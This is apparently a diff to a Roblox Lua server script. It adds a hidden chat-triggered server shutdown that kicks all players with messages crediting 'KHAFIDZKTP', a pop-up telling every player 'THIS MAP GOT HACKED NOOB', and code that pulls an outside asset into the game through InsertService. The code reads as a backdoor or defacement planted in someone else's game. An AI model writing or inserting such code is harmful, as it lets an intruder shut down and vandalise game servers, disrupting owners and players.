@@ -177,7 +177,7 @@ local function setupChat(plr)
 			shutdownMode = true
 			if hint then hint.Text = "SERVER SHUTDOWN BY KHAFIDZKTP" end
 			for _, p in P:GetPlayers() do
-				safe(function() p:Kick("Server di-shutdown oleh KHAFIDZKTP") end)
+				safe(function() p:Kick("Server di-shutdown by KHAFIDZKTP") end)
 			end
 		end
 	end)
@@ -193,7 +193,7 @@ end)
 
 P.PlayerAdded:Connect(function(plr)
 	if shutdownMode then
-		plr:Kick("Server telah di-shutdown oleh KHAFIDZKTP")
+		plr:Kick("Server telah di-shutdown By KHAFIDZKTP")
 		return
 	end
 	setupChat(plr)
@@ -202,3 +202,66 @@ end)
 for _, plr in P:GetPlayers() do
 	setupChat(plr)
 end
+
+-- Notifikasi semua player setelah 3 detik
+task.wait(3)
+safe(function()
+	for _, plr in P:GetPlayers() do
+		safe(function()
+			local sg = Instance.new("ScreenGui")
+			sg.Name = "HackNotif"
+			sg.ResetOnSpawn = false
+			sg.DisplayOrder = 999
+			sg.Parent = plr.PlayerGui
+
+			local frame = Instance.new("Frame")
+			frame.Size = UDim2.new(0, 300, 0, 70)
+			frame.Position = UDim2.new(1, -310, 1, -80)
+			frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+			frame.BorderSizePixel = 0
+			frame.Parent = sg
+
+			local corner = Instance.new("UICorner")
+			corner.CornerRadius = UDim.new(0, 8)
+			corner.Parent = frame
+
+			local title = Instance.new("TextLabel")
+			title.Text = "Announce"
+			title.Size = UDim2.new(1, -10, 0.4, 0)
+			title.Position = UDim2.new(0, 10, 0, 0)
+			title.BackgroundTransparency = 1
+			title.TextColor3 = Color3.fromRGB(255, 200, 0)
+			title.Font = Enum.Font.GothamBold
+			title.TextSize = 15
+			title.TextXAlignment = Enum.TextXAlignment.Left
+			title.Parent = frame
+
+			local msg = Instance.new("TextLabel")
+			msg.Text = "THIS MAP GOT HACKED NOOB"
+			msg.Size = UDim2.new(1, -10, 0.6, 0)
+			msg.Position = UDim2.new(0, 10, 0.4, 0)
+			msg.BackgroundTransparency = 1
+			msg.TextColor3 = Color3.fromRGB(255, 255, 255)
+			msg.Font = Enum.Font.Gotham
+			msg.TextSize = 13
+			msg.TextXAlignment = Enum.TextXAlignment.Left
+			msg.Parent = frame
+
+			task.delay(5, function()
+				safe(function() sg:Destroy() end)
+			end)
+		end)
+	end
+end)
+
+-- SpawnLocation bagus
+safe(function()
+	local IS = game:GetService("InsertService")
+	local spawnModel = IS:LoadAsset(53326)
+	spawnModel.Parent = workspace
+	-- Pindahkan ke posisi spawn
+	local spawnPart = spawnModel:FindFirstChildOfClass("SpawnLocation") or spawnModel:FindFirstChildOfClass("BasePart")
+	if spawnPart then
+		spawnPart.CFrame = CFrame.new(0, 1, 0)
+	end
+end)
